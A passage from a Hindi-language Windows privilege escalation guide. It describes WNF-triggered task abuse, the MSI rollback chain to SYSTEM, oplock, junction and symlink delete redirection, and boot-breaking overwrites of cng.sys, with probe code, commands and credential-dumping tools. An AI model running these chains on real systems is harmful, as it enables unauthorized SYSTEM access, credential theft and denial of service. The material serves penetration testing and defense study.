8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

आपके पास इस GitHub repository में सभी आवश्यक फ़ाइलें और जानकारी हैं:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium से High Integrity Level / UAC Bypass

**Integrity Levels** के बारे में जानने के लिए इसे पढ़ें:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **UAC और UAC bypasses** के बारे में जानने के लिए इसे पढ़ें:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root में Upload Directory Junctions

कोई application एक अनुमानित upload subdirectory बना सकता है, उसमें caller द्वारा दिया गया filename लिख सकता है, और फिर उस फ़ाइल को process कर सकता है। अगर कम privilege वाला user, server-side write से पहले उस subdirectory को हटा सकता है और उसकी जगह NTFS junction लगा सकता है, तो write junction को follow करके web-served directory में जा सकता है। वहाँ रखी गई script, web-service identity के तौर पर चल सकती है, अगर server उस file type को execute करता हो। यह application-विशिष्ट arbitrary-write boundary है; केवल writable upload directory या पहले से मौजूद junction से इसकी पुष्टि नहीं होती।

Upload handler में path construction और timing, subdirectory पर user के प्रभावी delete/create rights, destination के प्रभावी ACLs, writer द्वारा reparse points follow किए जाने की संभावना, और destination में files execute करने वाले web server की पुष्टि करें। Writer और web server की process identities की अलग-अलग पुष्टि करें। Passive inventory से directory ACLs और reparse metadata दिख सकते हैं, लेकिन इससे handler का behavior या भविष्य में junction swap होने की पुष्टि नहीं होती। अगर execution service account के तौर पर होती है, तो अलग token-privilege path पर विचार करने से पहले **actual process token** की जाँच करें।

## WNF-triggered privileged scheduled-task cleanup

कोई scheduled task, जो manual execution से इनकार करता है, फिर भी unprivileged trigger उजागर कर सकता है। किसी privileged task का audit करते समय, उसका XML export करें और task DACL, principal और action के साथ-साथ **सभी** triggers की जाँच करें। विशेष रूप से, `WnfStateChangeTrigger` में Windows Notification Facility (WNF) state का नाम होता है; अगर वह securable state वर्तमान user को update publish करने की अनुमति देती है, तो user `<AllowStartOnDemand>false</AllowStartOnDemand>` के बावजूद, task को उसकी configured identity के अंतर्गत अप्रत्यक्ष रूप से शुरू कर सकता है।<sup>[[43]](#references)</sup>

उदाहरण के लिए, Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task SYSTEM के तौर पर चलता था, एक standard user से WNF state `7508BCA32C079E41` के updates स्वीकार करता था, और Recall disabled होने पर भी `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` की जाँच करता था।<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

पहुँच की जाँच करने के लिए, `ntdll.dll` से `ZwUpdateWnfStateData` resolve करें, आठ-बाइट state name के लिए एक खाली update सबमिट करें, और return status का मिलान task के last-run data या Procmon activity से करें। नीचे दिया गया संक्षिप्त probe, Recall task के उदाहरण से byte sequence का उपयोग करता है; जिस task की जाँच की जा रही है, उसके लिए export किए गए bytes का उपयोग करें।<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Recursive cleanup को privileged deletion में बदलना

उपयोगी primitive केवल trigger नहीं, बल्कि attacker-controlled directory स्वीकार करने वाली privileged cleanup routine है। Enumeration से लेकर अंतिम बदलाव तक operation को trace करें: profile/session discovery, wildcard-selected children, `SHCreateItemFromParsingName`, और `IFileOperation::DeleteItem` इस बात के मजबूत संकेत हैं कि पहले से जाँचे गए pathname को बाद में recursively traverse किया जाएगा। यदि descendants को trusted directory handles के सापेक्ष open करके deletion से पहले validate नहीं किया जाता, तो attacker enumeration और use के बीच resolution बदल सकता है।<sup>[[43]](#references)</sup>

WNF trigger को नीचे बताए गए [oplock, junction और Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) के साथ pair करें: oplock cleaner को legitimate child चुन लेने के बाद रोकता है, जबकि writable ancestor को replace कर दिया जाता है, ताकि privileged delete के दोबारा शुरू होने पर वह `\RPC Control` के ज़रिए protected target तक पहुँचे। Recall chain में इससे SYSTEM के ज़रिए `C:\Config.Msi` delete हुआ, जो documented MSI rollback technique के लिए आवश्यक था।<sup>[[31]](#references)[[43]](#references)</sup>

### Nested descendants से shallow reparse-point fixes को bypass करना

केवल attacker-controlled root और उसके immediate child को validate करने से recursive pathname-based delete सुरक्षित नहीं होता। जाँचे गए objects को legitimate रखें और junction/oplock substitution को उनके नीचे एक अतिरिक्त child में ले जाएँ; `IFileOperation::DeleteItem` अंततः उस unvalidated descendant तक पहुँचता है और उसके नए target को follow करता है। CVE-2026-20941 इसी तरह के incomplete fix के कारण आया: पहले Recall patch ने `UKP` और GUID-shaped directory को validate किया, लेकिन पुराना recursive deletion operation बनाए रखा।<sup>[[43]](#references)</sup>

सुरक्षित तरीका यह है कि **हर descendant** को पहले से trusted directory handle के सापेक्ष open करें, final resolved path/object प्राप्त करके verify करें, और deletion disposition उसी verified handle पर लागू करें। किसी prefix को validate करके फिर recursive path-based deletion पर न लौटें। Patch review के दौरान वास्तविक call site पर मौजूद structures की भी जाँच करें: इस मामले में `NtCreateFile` पर `OBJECT_ATTRIBUTES` के runtime inspection से non-null `RootDirectory` और relative `{GUID}\\secure_file.lock` name दिखा, जिससे decompiler के भ्रामक output का खंडन हुआ, जिसमें दूसरी `FILE_DELETE_ON_CLOSE` primitive का संकेत था।<sup>[[43]](#references)</sup>

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP तक

इस technique का वर्णन [**इस blog post में**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) किया गया है और exploit code [**यहाँ उपलब्ध है**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)।<sup>[[31]](#references)[[32]](#references)</sup>

यह attack मूलतः Windows Installer के rollback feature का दुरुपयोग करके uninstallation के दौरान legitimate files को malicious files से replace करता है। इसके लिए attacker को एक **malicious MSI installer** बनाना होता है, जिसका उपयोग `C:\Config.Msi` folder को hijack करने के लिए किया जाएगा। बाद में Windows Installer इस folder का उपयोग अन्य MSI packages की uninstallation के दौरान rollback files store करने के लिए करेगा; इन rollback files को malicious payload रखने के लिए modified किया जा सकता है।

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

कम privilege वाला client `CMsiConfigurationManager` COM object (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) के ज़रिए SYSTEM `msiexec.exe` service तक पहुँच सकता है। Reverse engineering से संबंधित `IMsiServer` calls की पहचान vtable offset `0xA0` पर `MsiBeginTransactionW`, `0xC8` पर `SetEEUIDirectoryAndFilter`, और `0x50` पर `CleanupTempPackages` के रूप में हुई। ये नाम और offsets reverse-engineered हैं और अलग-अलग builds में बदल सकते हैं।<sup>[[41]](#references)</sup>

Non-administrator के मामले में, `SetEEUIDirectoryAndFilter` supplied path को `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, और `FILE_FLAG_OPEN_REPARSE_POINT` के साथ open करते समय ही caller का impersonation करता है। इससे साबित होता है कि caller directory delete कर सकता है और reparse point को follow करने से बचता है, लेकिन यह जाँचे गए file object को बाद की cleanup से **bind नहीं** करता और न ही यह साबित करता है कि Windows Installer ने उसे बनाया था।<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` के बाद, `SetEEUIDirectoryAndFilter` caller के filter argument की परवाह किए बिना path को folder के रूप में schedule करता है। Service `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` के अंतर्गत एक named `REG_DWORD` value लिखती है: value name caller-controlled path होता है और data `0x00000002` folder flag होता है। इसके बाद `CleanupTempPackages(NULL, FALSE)` सीधे cleanup शुरू करता है। इसका elevated worker registry values enumerate करता है और path provenance जाँचे बिना folder entries को recursive `FDeleteFolder` में भेजता है। यदि सामान्य removal विफल होता है, तो code `LockdownPath` भी call करता है, file attributes clear करता है और फिर से प्रयास करता है।<sup>[[41]](#references)</sup>

`msi.dll` से recovered minimal call sequence यह है:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

उपयोगी primitive, junction redirect के बजाय path reuse है। हमलावर द्वारा बनाया गया `C:\Config.Msi` register करें, उसे हटाएँ, और Windows Installer को बाद में protected rollback data के साथ वही pathname दोबारा बनाने दें। Cleanup पुराने `TempPackages` नाम पर भरोसा करता है और नई directory को SYSTEM के रूप में delete कर देता है। यह `FILE_FLAG_OPEN_REPARSE_POINT` और redirection-trust mitigation की तय सीमा को bypass करता है, क्योंकि इसमें किसी reparse point की ज़रूरत नहीं होती।<sup>[[41]](#references)</sup>

यह deletion primitive नीचे दी गई rollback chain में उपयोगी है: अलग `Installer\Folders` record को बनाए रखें, protected `C:\Config.Msi` को delete करें, उसे NULL DACL के साथ फिर बनाएँ, और installer द्वारा DACL को सुरक्षित करने से पहले `WRITE_DAC` वाला handle अपने पास रखें। पहले से खुला handle `NtSetSecurityObject` के ज़रिए permissive DACL बहाल कर सकता है, जिसके बाद rollback दोबारा शुरू होने से पहले बनाए गए `.rbs` को बदला जा सकता है।<sup>[[41]](#references)</sup>

Microsoft ने इस path को ठीक करते हुए, नया feature gate सक्षम होने पर `CMsiTransaction::SetEEUIDirectoryAndFilter` को `ScheduleFileOrFolderDelete` call करने से रोक दिया। COM call फिर भी success लौटा सकता है, लेकिन अब वह हमलावर के नियंत्रण वाला path `TempPackages` में नहीं जोड़ता। Patch की जाँच के लिए method का success return इस्तेमाल करने के बजाय April 2025 Windows security updates लागू करें।<sup>[[41]](#references)[[42]](#references)</sup>

संक्षेप में, technique इस प्रकार है:

1. **Stage 1 – Hijack की तैयारी (`C:\Config.Msi` को खाली छोड़ें)**

- Step 1: MSI install करें
    - ऐसा `.msi` बनाएँ जो writable folder (`TARGETDIR`) में harmless file (जैसे, `dummy.txt`) install करे।
    - Installer को **"UAC Compliant"** के रूप में mark करें, ताकि **non-admin user** उसे चला सके।
    - Install के बाद file का **handle** खुला रखें।

- Step 2: Uninstall शुरू करें
    - उसी `.msi` को uninstall करें।
    - Uninstall process files को `C:\Config.Msi` में ले जाना और उनका नाम बदलकर `.rbf` files (rollback backups) रखना शुरू करता है।
    - **`GetFinalPathNameByHandle` से खुले file handle को poll करें**, ताकि पता चले कि file कब `C:\Config.Msi\<random>.rbf` बनती है।

- Step 3: Custom Syncing
    - `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है, जो:
        - `.rbf` लिखे जाने पर signal करता है।
        - फिर uninstall जारी रखने से पहले किसी दूसरे event का **इंतज़ार करता है**।

- Step 4: `.rbf` का deletion रोकें
    - Signal मिलने पर, **`.rbf` file को `FILE_SHARE_DELETE` के बिना खोलें** — इससे **वह delete नहीं हो पाएगी**।
    - फिर वापस signal करें, ताकि uninstall पूरा हो सके।
    - Windows Installer `.rbf` delete नहीं कर पाता, और सभी contents delete न कर पाने के कारण **`C:\Config.Msi` हटाई नहीं जाती**।

- Step 5: `.rbf` को manually delete करें
    - आप (हमलावर) `.rbf` file को manually delete करें।
    - अब **`C:\Config.Msi` खाली है** और hijack के लिए तैयार है।

> इस बिंदु पर, `C:\Config.Msi` को delete करने के लिए **SYSTEM-level arbitrary folder delete vulnerability को trigger करें**।

2. **Stage 2 – Rollback Scripts को malicious scripts से बदलना**

- Step 6: कमजोर ACLs के साथ `C:\Config.Msi` फिर बनाएँ
    - `C:\Config.Msi` folder को खुद फिर बनाएँ।
    - **कमज़ोर DACLs** सेट करें (जैसे, Everyone:F), और `WRITE_DAC` वाला **handle खुला रखें**।

- Step 7: दूसरा Install चलाएँ
    - `.msi` को फिर install करें, जिसमें:
        - `TARGETDIR`: Writable location।
        - `ERROROUT`: एक variable जो जबरन failure कराए।
    - इस install का उपयोग **rollback को फिर trigger** करने के लिए होगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: `.rbs` पर नज़र रखें
    - `C:\Config.Msi` को monitor करने के लिए `ReadDirectoryChangesW` इस्तेमाल करें, जब तक कोई नया `.rbs` न दिखाई दे।
    - उसका filename रिकॉर्ड करें।

- Step 9: Rollback से पहले sync करें
    - `.msi` में एक **custom install action (`SyncBeforeRollback`)** शामिल है, जो:
        - `.rbs` बनने पर event signal करता है।
        - फिर जारी रखने से पहले **इंतज़ार करता है**।

- Step 10: कमज़ोर ACL फिर से लागू करें
    - `.rbs created` event मिलने के बाद:
        - Windows Installer, `C:\Config.Msi` पर **मज़बूत ACLs फिर से लागू करता है**।
        - लेकिन आपके पास अभी भी `WRITE_DAC` वाला handle है, इसलिए आप **कमज़ोर ACLs फिर से लागू कर सकते हैं**।

> ACLs **सिर्फ handle खुलने पर लागू होते हैं**, इसलिए आप फिर भी folder में लिख सकते हैं।

- Step 11: Fake `.rbs` और `.rbf` रखें
    - `.rbs` file को एक **fake rollback script** से overwrite करें, जो Windows को यह करने के लिए कहे:
        - आपकी `.rbf` file (malicious DLL) को किसी **privileged location** (जैसे, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) में restore करना।
    - अपनी fake `.rbf` रखें, जिसमें **malicious SYSTEM-level payload DLL** हो।

- Step 12: Rollback trigger करें
    - Sync event signal करें, ताकि installer फिर से शुरू हो।
    - एक **type 19 custom action (`ErrorOut`)** को तय बिंदु पर install को **जानबूझकर fail** करने के लिए configure किया गया है।
    - इससे **rollback शुरू होता है**।

- Step 13: SYSTEM आपकी DLL install करता है
    - Windows Installer:
        - आपकी malicious `.rbs` पढ़ता है।
        - आपकी `.rbf` DLL को target location पर copy करता है।
    - अब आपकी **malicious DLL, SYSTEM द्वारा load किए जाने वाले path में है**।

- अंतिम चरण: SYSTEM code execute करें
    - कोई trusted **auto-elevated binary** (जैसे, `osk.exe`) चलाएँ, जो hijack की गई DLL को load करे।
    - **धमाका**: आपका code **SYSTEM के रूप में execute होता है**।


### Arbitrary File Delete/Move/Rename से SYSTEM EoP तक

मुख्य MSI rollback technique (पिछली वाली) मानती है कि आप **पूरा folder** (जैसे, `C:\Config.Msi`) delete कर सकते हैं। लेकिन अगर आपकी vulnerability सिर्फ **arbitrary file deletion** की अनुमति देती है, तो क्या?

आप **NTFS internals** का exploit कर सकते हैं: हर folder में एक hidden alternate data stream होती है, जिसका नाम है:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

यह stream फ़ोल्डर का **index metadata** संग्रहीत करता है।

इसलिए, अगर आप किसी फ़ोल्डर की **`::$INDEX_ALLOCATION` stream को delete** करते हैं, तो NTFS फ़ाइल सिस्टम से **पूरा फ़ोल्डर हटा देता है**।

आप यह standard file deletion APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> भले ही आप *file* delete API को कॉल कर रहे हों, यह **खुद folder को delete कर देता है**।

### Folder Contents Delete से SYSTEM EoP तक
अगर आपका primitive आपको मनमानी files/folders delete करने की अनुमति नहीं देता, लेकिन **attacker-controlled folder के *contents* delete करने की अनुमति देता है**, तो क्या होगा?

1. Step 1: एक bait folder और file सेट अप करें
- बनाएँ: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** लगाएँ
- जब कोई privileged process `file1.txt` को delete करने की कोशिश करता है, तो oplock **execution को रोक देता है**।

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. चरण 3: SYSTEM process को trigger करें (जैसे, `SilentCleanup`)
- यह process folders (जैसे, `%TEMP%`) को scan करता है और उनकी contents delete करने की कोशिश करता है।
- जब यह `file1.txt` तक पहुँचता है, तो **oplock trigger होता है** और control आपके callback को सौंप देता है।

4. चरण 4: oplock callback के अंदर – deletion को redirect करें

- विकल्प A: `file1.txt` को कहीं और move करें
    - इससे oplock को तोड़े बिना `folder1` खाली हो जाता है।
    - `file1.txt` को सीधे delete न करें — इससे oplock समय से पहले release हो जाएगा।

- विकल्प B: `folder1` को **junction** में बदलें:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- विकल्प C: `\RPC Control` में **symlink** बनाएँ:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> यह NTFS की उस आंतरिक stream को target करता है जो folder metadata स्टोर करती है — इसे delete करने से folder delete हो जाता है।

5. Step 5: oplock रिलीज़ करें
- SYSTEM process जारी रहता है और `file1.txt` को delete करने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में इसे delete कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**परिणाम**: `C:\Config.Msi` को SYSTEM ने हटा दिया।

### किसी भी फ़ोल्डर को बनाने से स्थायी DoS तक

ऐसे primitive का exploit करें जो आपको **SYSTEM/admin के रूप में कोई भी फ़ोल्डर बनाने** देता है — भले ही **आप फ़ाइलें नहीं लिख सकते** या **कमज़ोर permissions सेट नहीं कर सकते**।

**फ़ाइल नहीं, फ़ोल्डर** बनाएँ, जिसका नाम किसी **महत्वपूर्ण Windows driver** के नाम जैसा हो, उदाहरण के लिए:
```
C:\Windows\System32\cng.sys
```

- यह path सामान्यतः `cng.sys` kernel-mode driver से मेल खाता है।
- अगर आप इसे **पहले से एक folder के रूप में बना देते हैं**, तो Windows boot के दौरान असली driver load नहीं कर पाता।
- इसके बाद, Windows boot के दौरान `cng.sys` load करने की कोशिश करता है।
- उसे folder दिखता है, **असली driver का पता नहीं लगा पाता**, और **crash हो जाता है या boot रुक जाता है**।
- **कोई fallback नहीं होता**, और बाहरी हस्तक्षेप (जैसे boot repair या disk access) के बिना **कोई recovery नहीं होती**।

### Privileged log/backup paths + OM symlinks से arbitrary file overwrite / boot DoS तक

जब कोई **privileged service** किसी **writable config** से पढ़े गए path पर logs/exports लिखती है, तो उस path को **Object Manager symlinks + NTFS mount points** से redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (यहां तक कि **SeCreateSymbolicLinkPrivilege के बिना भी**)।<sup>[[15]](#references)</sup>

**आवश्यकताएँ**
- Target path रखने वाला config attacker के लिए writable हो (जैसे, `%ProgramData%\...\.ini`)।
- `\RPC Control` पर mount point और OM file symlink बनाने की क्षमता हो (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।<sup>[[16]](#references)[[17]](#references)</sup>
- ऐसा privileged operation हो जो उस path पर लिखता हो (log, export, report)।

**उदाहरण chain**
1. Privileged log destination पता करने के लिए config पढ़ें, जैसे `C:\ProgramData\ICONICS\IcoSetup64.ini` में `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`।
2. बिना admin के path redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component द्वारा log लिखे जाने का इंतज़ार करें (जैसे, admin “test SMS भेजें” ट्रिगर करता है)। अब write `C:\Windows\System32\cng.sys` में होगा।
4. Overwritten target का निरीक्षण करें (hex/PE parser) और corruption की पुष्टि करें; reboot करने पर Windows tampered driver path को load करेगा → **boot loop DoS**। यह किसी भी ऐसी protected file पर भी लागू होता है जिसे कोई privileged service write के लिए खोलेगी।

> `cng.sys` आम तौर पर `C:\Windows\System32\drivers\cng.sys` से load होती है, लेकिन अगर उसकी copy `C:\Windows\System32\cng.sys` में मौजूद हो, तो उसे पहले आज़माया जा सकता है। इससे यह corrupt data के लिए एक भरोसेमंद DoS sink बन जाता है।



## **High Integrity से System तक**

### **नई service**

अगर आप पहले से High Integrity process में चल रहे हैं, तो **SYSTEM तक पहुँचने का रास्ता** आसान हो सकता है—बस एक नई service **बनाएँ और execute करें**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Service binary बनाते समय सुनिश्चित करें कि वह एक valid service हो या binary आवश्यक actions तेज़ी से करे, क्योंकि valid service न होने पर उसे 20s में बंद कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries को enable** करने और _**.msi**_ wrapper का उपयोग करके reverse shell **install** करने की कोशिश कर सकते हैं।\
[इसमें शामिल registry keys और _.msi_ package install करने के तरीके के बारे में अधिक जानकारी यहाँ है।](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**code यहाँ पा सकते हैं**](seimpersonate-from-high-to-system.md)**।**

### SeDebug + SeImpersonate से Full Token privileges तक

यदि आपके पास ये token privileges हैं (संभवतः आपको ये पहले से High Integrity process में मिलेंगे), तो आप SeDebug privilege का उपयोग करके **लगभग किसी भी process** (protected processes को छोड़कर) को **open** कर पाएँगे, उस process का **token copy** कर पाएँगे, और उस token के साथ **मनमाना process बना** पाएँगे।\
इस technique में आमतौर पर **ऐसा कोई भी process चुना जाता है जो SYSTEM के रूप में सभी token privileges के साथ चल रहा हो** (_हाँ, आपको SYSTEM processes ऐसे भी मिल सकते हैं जिनके पास सभी token privileges नहीं हैं_)।\
**यहाँ आपको** [**प्रस्तावित technique को execute करने वाले code का एक**](sedebug-+-seimpersonate-copy-token.md) **उदाहरण मिल सकता है।**

### **Named Pipes**

इस technique का उपयोग meterpreter, `getsystem` में privilege escalation के लिए करता है। इस technique में **एक pipe बनाना और फिर उस pipe पर लिखने के लिए कोई service बनाना/उसका दुरुपयोग करना शामिल है**। इसके बाद, **pipe बनाने वाला server**, **`SeImpersonate`** privilege का उपयोग करके, pipe client (service) के **token को impersonate** कर पाएगा और SYSTEM privileges प्राप्त करेगा।\
अगर आप [**name pipes के बारे में और जानना चाहते हैं, तो यह पढ़ें**](#named-pipe-client-impersonation)।\
अगर आप [**name pipes का उपयोग करके high integrity से System तक पहुँचने का उदाहरण पढ़ना चाहते हैं, तो यह पढ़ें**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

अगर आप **SYSTEM के रूप में चल रहे किसी process द्वारा load की जा रही dll को hijack** कर पाते हैं, तो आप उन permissions के साथ मनमाना code execute कर पाएँगे। इसलिए Dll Hijacking इस तरह की privilege escalation के लिए भी उपयोगी है। इसके अलावा, **इसे high integrity process से करना कहीं आसान है**, क्योंकि उस process के पास dlls load करने के लिए इस्तेमाल होने वाले folders पर **write permissions** होंगी।\
**आप** [**Dll hijacking के बारे में यहाँ और जान सकते हैं**](dll-hijacking/index.html)**।**

### **Administrator या Network Service से System तक**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE या NETWORK SERVICE से full privs तक

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- गलत configurations और sensitive files की जाँच करता है (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)। Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित गलत configurations की जाँच करता है और जानकारी जुटाता है (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)।**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- गलत configurations की जाँच करता है**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla और RDP की saved session जानकारी निकालता है। Local में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- जुटाए गए passwords को domain में spray करता है**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजता है (Watson के लिए DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights आवश्यक हैं)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजता है (VisualStudio का उपयोग करके compile करना आवश्यक है) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- गलत configurations खोजने के लिए host की enumeration करता है (यह privesc से अधिक जानकारी जुटाने वाला tool है) (compile करना आवश्यक है) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई software से credentials निकालता है (github में precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# में port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- गलत configuration की जाँच करता है (github में executable precompiled)। इसकी अनुशंसा नहीं की जाती। यह Win10 में ठीक से काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित गलत configurations की जाँच करता है (python से exe)। इसकी अनुशंसा नहीं की जाती। यह Win10 में ठीक से काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस post के आधार पर बनाया गया tool (ठीक से काम करने के लिए इसे accesschk की आवश्यकता नहीं है, लेकिन यह उसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** का output पढ़ता है और काम करने वाले exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** का output पढ़ता है और काम करने वाले exploits सुझाता है (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको project को .NET के सही version का उपयोग करके compile करना होगा ([यह देखें](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/))। Victim host पर .NET का installed version देखने के लिए आप यह कर सकते हैं:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Privilege Escalation की मूल बातें](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [कमजोर फ़ोल्डर permissions का exploit करके privileges बढ़ाना](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - एक cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT नया black है (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - संपूर्ण OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentesters के लिए Windows Privilege Escalation के तरीके](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
